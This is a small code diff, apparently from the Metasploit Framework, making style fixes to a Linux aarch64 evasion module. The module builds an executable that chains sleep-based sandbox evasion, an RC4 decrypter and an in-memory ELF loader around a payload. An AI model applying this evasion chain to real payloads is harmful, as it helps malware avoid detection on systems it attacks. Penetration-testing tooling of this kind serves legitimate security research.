@@ -45,10 +45,10 @@ class MetasploitModule < Msf::Evasion
     end
     
     elf_payload = Msf::Util::EXE.to_linux_aarch64_elf(framework, raw_payload)
-    complete_loader = sleep_evasion( seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
+    complete_loader = sleep_evasion(seconds: datastore['SLEEP_TIME']) + rc4_decrypter(data: (in_memory_load(elf_payload) + elf_payload))
     final_elf = Msf::Util::EXE.to_linux_aarch64_elf(framework, complete_loader)
 
     File.binwrite(datastore['FILENAME'], final_elf)
-    File.chmod(0755, datastore['FILENAME'])
+    File.chmod(0o755, datastore['FILENAME'])
   end
 end
